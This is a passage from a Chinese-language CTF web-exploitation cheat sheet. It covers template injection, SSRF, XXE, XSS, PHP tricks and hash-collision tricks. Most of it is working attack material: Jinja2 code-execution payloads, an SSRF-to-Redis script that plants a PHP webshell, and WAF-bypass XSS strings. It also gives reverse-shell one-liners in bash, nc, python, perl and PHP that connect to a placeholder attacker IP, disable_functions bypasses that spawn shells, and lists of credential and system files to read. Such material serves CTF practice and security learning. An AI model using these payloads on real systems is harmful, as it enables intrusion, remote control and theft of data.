&x3=__subclasses__
?guess={{ ({}|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)())|attr(request.args.x6)(165)|attr(request.args.x4)|attr(request.args.x5)|attr(request.args.x6)(request.args.x7)|attr(request.args.x6)(request.args.x8)(request.args.x9)}}
&x1=__class__
&x2=__base__
&x3=__subclasses__
&x4=__init__
&x5=__globals__
&x6=__getitem__
&x7=__builtins__
&x8=eval
&x9=__import__("os").popen("ls").read()
```
过滤了`[]、_、args、单双引号、不允许POST`还可以使用request.cookies

过滤了数字，可以使用特殊的数字来绕过[https://www.compart.com/en/unicode/bidiclass/EN](https://www.compart.com/en/unicode/bidiclass/EN)
![](https://img-blog.csdnimg.cn/2021032916462523.png)
然后就可以使用`join`进行拼接构造字符
![](https://img-blog.csdnimg.cn/20210329165145303.png)

[XCTF高校网络安全专题挑战赛-华为云专场部分WP ](https://mp.weixin.qq.com/s/fkiFV7u3QjDsfHDcdwl6iA)
[0RAYS-安洵杯writeup ](https://www.anquanke.com/post/id/223895)

可参考文章：
[SSTI模板注入绕过（进阶篇）](https://blog.csdn.net/miuzzx/article/details/110220425)
[SSTI模板注入及绕过姿势(基于Python-Jinja2)](https://blog.csdn.net/solitudi/article/details/107752717)
[Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
[从零学习flask模板注入](https://www.freebuf.com/column/187845.html)

### SSRF
URL伪协议：
```php
file://  本地文件传输协议，File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样
dict://  Dict协议,字典服务器器协议,dict是基于查询响应的TCP协议,它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628
gopher://  Gopher协议是互联网上使用的分布型的文件搜集获取网络协议。gopher协议是在HTTP协议出现之前,在internet上常见重用的协议,但是现在已经用的很少了
sftp://  Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作
ldap://  LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议
tftp://  TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。
```
**绕过ip检测：**
1. 使用http://example.com@evil.com
2. IP地址转为进制，以及IP地址省略写法：

```
http://localhost
http://[::] >>> http://127.0.0.1
0177.00.00.01(八进制)
2130706433(十进制)
0x7f.0x0.0x0.0x1(十六进制)
127.1(IP地址省略写法)
```

3. curl可以用句号(。)代替点(.)
4. `enclosed alphanumerics`代替ip中的数字或者网址中的字母
[Unicode Characters in the Enclosed Alphanumerics Block](http://www.fileformat.info/info/unicode/block/enclosed_alphanumerics/images.htm)
5. windows下，0代表0.0.0.0，而在linux下，0代表127.0.0.1，`http://0`进行请求127.0.0.1，也可以将0省略`127.1`


**有strpos的限制（利用%2570绕过）**
>如果向strpos传入一个双重url编码的字符串，可以达到绕过的目的
比如我们这里可以使x=%2570，就可以绕过strpos($x,"php")
(%25是%的url编码,%70是p的url编码)
即：http://127.0.0.1/?x=file:///var/www/html/index.ph%2570

**curl函数**
```php
<?php
	echo "<!-- /?url= -->";
	if ($_GET['url']) {
	if (preg_match("/flag/i", $_GET['url'])) {
	die();
	}
	$curl = curl_init();
	
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_TIMEOUT, 500);
	curl_setopt($curl, CURLOPT_URL, $_GET['url']);
	
	$res = curl_exec($curl);
	curl_close($curl);
	echo $res;
}
```
因使用了curl函数，curl会在处理请求的时候再进行一次urldecode。故构造payload时二次urlencode即可绕过
`file:///%2566%256c%2561%2567`

SSRF打redis：
```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
#__author__: 颖奇L'Amore www.gem-love.com

import requests as req 

url = "http://eci-2zebigmdhrm1h25i2qcw.cloudeci1.ichunqiu.com/"

def g_redis(s, num):
	res = ''
	for i in s:
		res += f"%{'%02x' % ord(i)}"
	if num > 0:
		return g_redis(res, num-1)
	else:
		return res

payload = "\r\n".join(["","set a '<?php eval($_POST[Y1ng]); ?>'","config set dir /var/www/html","config set dbfilename y1ng.php","save","test"])
req.get(url=url+"?url=http://@127.0.0.1:5000@www.baidu.com/?url=http://127.0.0.1:6379?"+g_redis(payload, 1))
```

参考文章：
[服务端请求伪造（SSRF）之Redis篇](https://www.freebuf.com/sectool/242692.html)
[一次“SSRF-->RCE”的艰难利用 ](https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA)
[工具：Gopherus](https://github.com/tarunkant/Gopherus)
[浅谈SSRF 加redis反弹shell](https://blog.csdn.net/god_zzZ/article/details/105023855)
[Redis和SSRF](https://xz.aliyun.com/t/1800)
[Gopher协议在SSRF漏洞中的深入研究（附视频讲解）](https://zhuanlan.zhihu.com/p/112055947)
[SSRF in PHP](https://joychou.org/web/phpssrf.html)
[了解SSRF,这一篇就足够了](https://xz.aliyun.com/t/2115)
[学习笔记-SSRF基础](https://www.jianshu.com/p/095f233cc9d5)
[SSRF技巧之如何绕过filter_var( )](https://www.anquanke.com/post/id/101058)
[SSRF绕过方法总结](https://mp.weixin.qq.com/s/FSUWQ3qizAKwpA5cTACFng)
### XML,XXE
安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<root>
<name>&xxe;</name>
</root>
```
外部实体 (libxml < 2.90)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<userInfo>
<name>&xxe;</name>
</userInfo>
```
[一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)
[从XML相关一步一步到XXE漏洞](https://xz.aliyun.com/t/6887)
[XXE漏洞利用技巧：从XML到远程代码执行](https://www.freebuf.com/articles/web/177979.html)

### XSS
使用通用 XSS 攻击字串手动检测 XSS 漏洞：
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write() 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。

**绕过magic_quotes_gpc：**在magic_quotes_gpc=On的情况下，如果输入的数据有单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）等字符都会被加上反斜线
使用String.fromCharCode()，把ascii转换为字符串
`alert("xss")  ==> String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41)`

图片标签：`<img src="#" onerror=alert('xss')>`
xssDOM型绕过
`?#default=<script>alert(/xss/)</script>`用#绕过后端过滤

**奇技淫巧：**
```html
%ff<!---><svg/onload=top[/al/.source+/ert/.source]&lpar;)>
<%00EEEE<svg /\/\//ONLoad='a\u006c\u0065\u0072\u0074(1)'/\/\/\>svg>%0APayload
<html \" onmouseover=/*&lt;svg/*/onload=alert(2)//>
<script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
<script>eval('\\u'+'0061'+'lert`_Y000!_`')</script>
<script>throw~delete~typeof~prompt`_Y000!_`</script>
<script>(()=>{return this})().alert`_Y000!_`</script>
<ijavascriptmg+src+ojavascriptnerror=confirm(1)>

<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
<svg%0Aonauxclick=0;[1].some(confirm)//
/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
<svg/onload='+/"/+/onmouseover=1/+/[/[]/+alert(9527)//'>
```
WAFbypass payload:
```javascript
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)"/>click
```
xss payload大全：[XSS-Payloads](https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt)

参考文章：
[奇技淫巧(全) - XSS payload ](https://mp.weixin.qq.com/s/2psSNI8GATMc8fx8o3Jl8w)
[前端安全系列（一）：如何防止XSS攻击？](https://segmentfault.com/a/1190000016551188)
### 杂知识
>/.bash_history  (泄露历史执行命令)
/.bashrc    (部分环境变量)
/.ssh/id_rsa(.pub) (ssh登录私钥/公钥)
/.viwinfo (vim历史记录)

查看源代码：ctrl+u，F12，Ctrl+shift+i，右键查看，view-source：
不可显字符 ：%80 – %ff
IP伪造：X-Forwarded-For/Client-IP/X-Real-IP/CDN-Src-IP/X-Remote-IP
从某国家访问，一般修改Accept-Language
从某个页面访问就修改Referer，Origin

搜索最近100分钟被修改过的文件:
`find / -type f -mmine -100`

#### apache2,nginx重要文件位置
配置文件：
>/usr/local/apache2/conf/httpd.conf
/usr/local/etc/apache2/httpd.conf
/usr/local/nginx/conf/nginx.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf
/etc/nginx/conf.d/default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default.conf
$TOMCAT_HOME/conf/tomcat-users.xml
$TOMCAT_HOME/conf/server.xml

其他：
>/proc/self/cmdline
/proc/self/fd/[0-9]*
/proc/self/environ
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/sched_debug
.htaccess
~/.bash_profile
~/.bash_logout
~/.env
/etc/passwd
/etc/shadow
/etc/hosts
/root/.ssh/id_rsa
/root/.ssh/authorized_keys


![](./images/pasted-153.png)
[Linux /proc/pid目录下相应文件的信息说明和含义](https://blog.csdn.net/enweitech/article/details/53391567)
[/proc目录的妙用](http://www.rayi.vip/2020/11/01/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8/)

日志信息：
>/usr/local/var/log/nginx/access.log
/var/log/nginx/access.log
/var/logdata/nginx/access.log
/var/log/nginx/error.log
/var/log/apache2/error.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/mail.log

#### 反弹shell
```bash
#Bash
bash -i >& /dev/tcp/vps_ip/6666 0>&1
bash -c "bash -i >& /dev/tcp/vps_ip/6666 0>&1"
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect vps_ip:2333 > /tmp/s; rm /tmp/s

#nc
nc -e /bin/sh vps_ip 6666
mknod backpipe p && nc vps_ip 8080 0<backpipe | /bin/bash 1>backpipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc vps_ip 1234 >/tmp/f
在自己机器上监听两个端口：nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999

#python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps_ip",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"vps_ip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl -e 'use Socket;$i="vps_ip";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#DNS_Shell
https://github.com/ahhh/Reverse_DNS_Shell

#icmp_shell
http://icmpshell.sourceforge.net/

#Linux(index.js)
https://github.com/lukechilds/reverse-shell

#PHP：
php -r '$sock=fsockopen("vps_ip",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
https://github.com/pentestmonkey/php-reverse-shell

#JSP：
https://github.com/z3v2cicidi/jsp-reverse-shell

#ASPX： 
https://github.com/borjmz/aspx-reverse-shell
```

得到shell后可以
`python -c "import pty;pty.spawn('/bin/bash')"` 获取交互

在线生成工具：
[java命令执行payloads](https://x.hacking8.com/?post=293)
[ Runtime.exec Payload encode](https://ares-x.com/tools/runtime-exec/)
[Reverse Shell Generator](https://www.revshells.com/)

可参考文章：
[https://github.com/t0thkr1s/revshellgen](https://github.com/t0thkr1s/revshellgen)
[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
[Linux下反弹shell的种种方式](https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html)
[Spawning A TTY Shell-逃逸Linux各种Shell来执行命令](https://www.lshack.cn/653/)
[Linux下几种反弹Shell方法的总结与理解](https://www.freebuf.com/articles/system/178150.html)
[【技术分享】linux各种一句话反弹shell总结 ](https://www.anquanke.com/post/id/87017)

### php相关内容
[php7-函数特性分析](http://www.pdsdt.lovepdsdt.com/index.php/2019/10/17/php7-函数特性分析/)
[PHP绕过姿势](https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/)
[CTF 知识库 ](https://ctf.ieki.xyz/library/)
[CTF/PHP特性汇总](https://www.anquanke.com/post/id/231507)

**命令执行函数：**
system()，passthru()，echo exec()，echo shell_exec()，echo 反引号，

popen() 函数打开进程文件指针。
语法：`popen(command,mode)`

参数	|描述
-----|-----
command	|必需。规定要执行的命令。
mode	|必需。规定连接模式。 可能的值：r: 只读。w: 只写 (打开并清空已有文件或创建一个新文件)

proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。
(PHP 4 >= 4.3.0, PHP 5, PHP 7)
类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力

scandir：列出指定路径中的文件和目录

>通过fopen读文件内容：
函数：fread()，fgets()，fgetc()，fgetss()，fgetcsv()，gpassthru()

php文件读取小技巧
```php
var_dump(((strrev(stnetnoc_teg_elif)))((strrev(edoced_46esab))(Li8uLi8uLi8uLi8uLi8uLi8uLi9mbGFn)));  //file_get_contents(./../../../../../../flag);
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetss($a);echo $line;} //php7.3版本后 该函数已不再被使用
$a=fopen("flag.php","r");echo fpassthru($a); 
$a=fopen("flag.php","r");echo fread($a,"1000"); 
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);print_r($line);}
```
**代码执行**
eval()，assert()，preg_replace()

[PHP代码执行函数总结](https://www.cnblogs.com/xiaozi/p/7834367.html)
[深入研究preg_replace与代码执行](https://xz.aliyun.com/t/2557)

**读取文件函数：**
```php
readfile()，show_source()，highlight_file()，var_dump(file_get_contents())，print_r(file_get_contents())，print_r(file())，copy("flag.php","flag.txt")，rename("flag.php","flag.txt")
```
简单绕过：
`var_dump(scandir(chr(47)))  char(47)是 / 的ascii码，也可以用hex2bin(dechex(47))
var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`

[php源码分析 require_once 绕过不能重复包含文件的限制 ](https://www.anquanke.com/post/id/213235)

phpinfo()被ban，利用其他方式来读取配置信息
```php
var_dump(get_cfg_var("disable_functions"));
var_dump(get_cfg_var("open_basedir"));
var_dump(ini_get_all());
```
#### 绕过php的disable_functions
>1.攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞
2.寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()
3.mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制
4.利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果

[PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数 ](https://www.anquanke.com/post/id/197745)
##### LD_PRELOAD
```php
linux环境
putenv()、mail()可用
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
http://192.168.0.107/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so
outpath是命令输出位置，sopath指定so文件路径。
或
替换php文件中的mail为error_log("a",1);
```
[disable_function绕过--利用LD_PRELOAD](https://www.cnblogs.com/sijidou/p/10816385.html)
[无需sendmail：巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/articles/web/192052.html)
[深入浅出LD_PRELOAD & putenv()](https://www.anquanke.com/post/id/175403)

##### php7.0-7.4 bypass
```
直接bypass
https://github.com/mm0r1/exploits
```
##### windows系统组件com绕过
```php
<?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```
##### CGI启动方式
使用linux shell脚本编写的cgi程序便可以执行系统命令.
.htaccess ：
```
Options +ExecCGI
AddHandler cgi-script .ant
```
shell.ant：
```bash
#!/bin/sh
echo&&cd "/var/www/html/backdoor";tac /flag;echo [S];pwd;echo [E]
```

##### ImageMagick组件绕过
imageMagick 版本 v6.9.3-9 或 v7.0.1-0

第一种：
```php
<?php
echo "Disable Functions: " . ini_get('disable_functions') . "\n";
$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
$command = 'id';
}
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'    //核心
pop graphic-context
EOF;
file_put_contents("KKKK.mvg", $exploit);
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
?>
```

第二种：
```c
#include <stdlib.h>
#include <string.h>
void payload() {
const char* cmd = "nc -e /usr/bin/zsh 127.0.0.1 4444";
system(cmd);
}
int fileno() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}
```
编译
`gcc -shared -fPIC imag.c -o imag.so`
```php
<?php
putenv('LD_PRELOAD=/var/www/html/imag.so');
$img = new Imagick('/tmp/1.ps');
?>
```
##### pcntl_exec
```
开启了pcntl 扩展，并且php 4>=4.2.0 , php5 , linux
```
```php
<?php
if(function_exists('pcntl_exec')) {
pcntl_exec("/bin/bash", array("/tmp/test.sh"));
} else {
echo 'pcntl extension is not support!';
}
?>
```
test.sh：
```bash
#!/bin/bash
nc -e /bin/bash 1.1.1.1 8888       #反弹shell
```

##### imap_open函数
```php
<?php
error_reporting(0);
if (!function_exists('imap_open')) {
die("no imap_open function!");
}
$server = "x -oProxyCommand=echo\t" . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . "|base64\t-d|sh}";
imap_open('{' . $server . ':143/imap}INBOX', '', '');
sleep(5);
echo file_get_contents("/tmp/cmd_result");
?>
```
##### php7.4 FFI绕过
>php 7.4
ffi.enable=true

```php
<?php
$a='nc -e /bin/bash ip 8888';
$ffi = FFI::cdef(
    "int system(char *command);",
    "libc.so.6");
$ffi->system($a);
?>
```
[利用 PHP 中的 FFI 扩展执行命令](https://mp.weixin.qq.com/s/4U1HYCC5MeP5KsqBPQhzoQ)
##### shellshock
>存在CVE-2014-6271漏洞
PHP 5.*，linux，putenv()、mail()可用

```php
<?php
function shellshock($cmd) {
$tmp = tempnam(".","data");
putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
mail("a@127.0.0.1","","","","-bv");
$output = @file_get_contents($tmp);
@unlink($tmp);
if($output != "") return $output;
else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>
```

[PHP中通过bypass disable functions执行系统命令的几种方式](https://www.freebuf.com/articles/web/169156.html)
[Bypass disabled_functions一些思路总结](https://xz.aliyun.com/t/4623#toc-8)
[bypass disable_function总结学习](https://www.cnblogs.com/tr1ple/p/11213732.html)
[PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数](https://www.anquanke.com/post/id/197745)
[针对宝塔的RASP及其disable_functions的绕过](https://xz.aliyun.com/t/7990)

#### open_basedir绕过
第一种：
```php
a=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');};
a=if($b = opendir("glob:///var/www/html/*.php") ) {while ( ($file = readdir($b)) !== false ) {echo "filename:".$file."\n";} closedir($b);}
```
第二种：
```php
a=ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');system('cat ../../../../../etc/passwd');
a=mkdir("/tmp/crispr");chdir('/tmp/crispr/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('.'));
?cmd=mkdir('bmth');chdir('bmth');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('.'));var_dump(file_get_contents("/usr/local/etc/php/php.ini"));
```
第三种：
```php
?a=show_source('/flag');
?a=echo(readfile('/flag'));
?a=print_r(readfile('/flag'));
?a=echo(file_get_contents('/flag'));
?a=print_r(file_get_contents('/flag'));
```
[php5全版本绕过open_basedir读文件脚本](https://www.leavesongs.com/bypass-open-basedir-readfile.html)
[bypass open_basedir的新方法](https://xz.aliyun.com/t/4720)
[浅谈几种Bypass open_basedir的方法](https://www.cnblogs.com/hookjoy/p/12846164.html)

#### php审计
strpos：数组绕过
ereg正则：%00截断

[经典写配置漏洞与几种变形](https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html)
[PHP配置文件经典漏洞 ](https://www.cnblogs.com/wh4am1/p/6607837.html)
[PHP函数漏洞总结](https://blog.csdn.net/qq_39293438/article/details/108247569)
[利用PHP的一些特性绕过WAF](https://mochazz.github.io/2019/01/03/%E5%88%A9%E7%94%A8PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87WAF/)
[PHP代码审计分段讲解](https://github.com/bowu678/php_bugs)
[PHP trick（代码审计关注点）](https://paper.seebug.org/561/)
[ctf中代码审计以及自己的总结](https://blog.csdn.net/weixin_43999372/article/details/86631794)

##### 绕过 filter_var 的 FILTER_VALIDATE_URL 过滤器
```
http://localhost/index.php?url=http://demo.com@sec-redclub.com
http://localhost/index.php?url=http://demo.com&sec-redclub.com
http://localhost/index.php?url=http://demo.com?sec-redclub.com
http://localhost/index.php?url=http://demo.com/sec-redclub.com
http://localhost/index.php?url=demo://demo.com,sec-redclub.com
http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/
http://localhost/index.php?url=http://demo.com#sec-redclub.com
PS:最后一个payload的#符号，请换成对应的url编码 %23
```
可以用javascript伪协议进行绕过，`javascript://`

文章：[SSRF技巧之如何绕过filter_var( )](https://www.anquanke.com/post/id/101058)
##### 绕过 parse_url 函数
parse_url用`///`绕过，多加了一个/导致parse_url()返回FALSE

利用curl和parse_url的解析差异：`/?url=http://@127.0.0.1:80@www.baidu.com/hint.php`

##### create_function()代码注入
`create_function()`函数有两个参数`$args`和`$code`，用于创建一个lambda样式的函数
由于$code可控，底层又没有响应的保护参数，就导致出现了代码注入。见如下例子：
```php
<?php
$myFunc = create_function('$a, $b', 'return($a+$b);}eval($_POST['Y1ng']);//');
```
执行时的myFunc()为：
```php
function myFunc($a, $b){
	return $a+$b;
}
eval($_POST['Y1ng']);//}
```
通过手工闭合`}`使后面的代码`eval()`逃逸出了`myFunc()`得以执行，然后利用注释符`//`注释掉`}`保证了语法正确

##### SESSION绕过
```php
<?php
session_start(); 
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print '<p>Wrong guess.</p>';
}
```
session在判断时是没有值的，构造第二个if语句左右均为空值

##### intval整数溢出
php整数上限溢出绕过intval:
>intval 函数最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。 64 位系统上，最大带符号的 integer 值是 9223372036854775807。

##### 浮点数精度忽略
```php
if ($req["number"] != intval($req["number"]))
```
在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。 输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等

##### inclue用?截断
```php
<?php
$name=$_GET['name'];  
$filename=$name.'.php';  
include $filename;  
?>
```
当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。 测试POC： `http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?` 则会打开secret.txt中的文件内容
本测试用例在PHP5.5.38版本上测试通过

**CVE-2018-12613Phpmyadmin**
如果将`?`双重编码，经过包含时会把你包含的文件当作一个目录，也就是说，如果你写入：
`hint.php%25%3F(%25%3F是?的二次编码)`
那么解析时会把hint.php当作一个目录来看
##### md5的值与自身弱相等
```php
$md5=$_GET['md5'];
if($md5==md5($md5))
```
爆破脚本：
```python
import hashlib

for i in range(0,10**33):
    i = str(i)
    # i = i.zfill(33)
    num = '0e' + i
    md5 = hashlib.md5(num.encode()).hexdigest()
    if md5[0:2] == '0e' and md5[2:].isdigit():
        print('success str:{}  md5(str):{}'.format(num, md5))
        break
    else:
        print("trying {}".format(num))
```
得到0e215962017，md5为0e291242476940776845150308577824

**同理进行扩展学习：**
```php
import hashlib

for i in range(1200000000,10**33):
    i = str(i)
    num = '0e' + i
    md5 = hashlib.md5(num.encode()).hexdigest()
    md5 = hashlib.md5(md5.encode()).hexdigest()
    # print(md5)
    if md5[0:2] == '0e' and md5[2:].isdigit():
        print('success str:{}  md5(str):{}'.format(num, md5))
        break
    else:
        if int(i) % 1000000 == 0:
         print(i)
```
```php
$md5==md5(md5($md5)):
str:0e1138100474  md5(str):0e779212254407018184727546255414
str:0e1576609003  md5(str):0e783827937870189505146310298941
$md4==hash("md4",$md4):
明文 :0e251288019 md4密文: 0e874956163641961271069404332409
明文 : 0e001233333333333334557778889 md4密文: 0e434041524824285414215559233446
```
**两个变量长度不能超过5，但md5的值又要相同，而且强弱比较也不能相同**
php预定义常量绕过
`M_PI，M_E，M_LN2，NAN，INF`
>`NAN`和`INF`，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至`NAN===NAN`都是false，但`md5('NaN')===md5('NaN')`为true。
```php
<?php
$a = INF;
$b = (string)$a;
var_dump($a) ;
var_dump($b);
echo md5($a);
echo "\n";
echo md5($b);
```
![](https://img-blog.csdnimg.cn/20200922132818970.png#pic_center)
```php
var_dump(md5('INF'));
//9517fd0bf8faa655990a4dffe358e13e
var_dump(md5(9e999999));//9e999999即INF
//9517fd0bf8faa655990a4dffe358e13e
```

发现还有另一种解法
![](https://img-blog.csdnimg.cn/20200929164042536.png#pic_center)
```php
var_dump(md5(0.01));
//04817efd11c15364a6ec239780038862
var_dump(md5(0.1*0.1));
//04817efd11c15364a6ec239780038862
```
[ciscn2020复现-web-Easytrick](https://blog.csdn.net/qq_44657899/article/details/108196883)

##### md5强碰撞
[www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip](www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip)
`fastcoll_v1.0.0.5.exe -p 1.txt -o 2.txt 3.txt`
运行fastcoll 输入以下参数：-p是源文件 -o 是输出文件
```php
<?php 
function  readmyfile($path){
    $fh = fopen($path, "rb");
    $data = fread($fh, filesize($path));
    fclose($fh);
    return $data;
}
echo '二进制md5加密 '. md5((readmyfile("1.txt")));
echo "</br>";
echo  'url编码 '. urlencode(readmyfile("1.txt"));
echo "</br>";
echo '二进制md5加密 '.md5((readmyfile("2.txt")));
echo "</br>";
echo  'url编码 '.  urlencode(readmyfile("2.txt"));
echo "</br>";
```
得到
```
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```
[如何用不同的数值构建一样的MD5 - 第二届强网杯 MD5碰撞 writeup](https://xz.aliyun.com/t/2232)
[浅谈md5弱类型比较和强碰撞](https://www.secpulse.com/archives/153442.html)
[MD5强碰撞](https://www.cnblogs.com/kuaile1314/p/11968108.html)
##### sha1强碰撞
[https://shattered.it/static/shattered-1.pdf](https://shattered.it/static/shattered-1.pdf)
[https://shattered.it/static/shattered-2.pdf](https://shattered.it/static/shattered-2.pdf)
```python
import urllib

print(urllib.quote(open("shattered-1.pdf","rb").read()[:320]))
print(urllib.quote(open("shattered-2.pdf","rb").read()[:320]))
```
生成的两个sha1是完全相等的
```
